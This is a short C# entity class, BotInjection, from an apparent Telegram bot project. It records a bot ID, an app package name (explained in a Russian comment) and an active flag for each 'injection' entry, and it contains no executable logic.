namespace TelegramInjectionBot.Data;

public class BotInjection
{
    public ulong Id { get; set; }
    public string BotId { get; set; }

    /// <summary>
    ///     Название пакета приложения. Пример: org.app.name
    /// </summary>
    public string Application { get; set; }

    public bool IsActive { get; set; }

    public virtual Bot Bot { get; set; }
}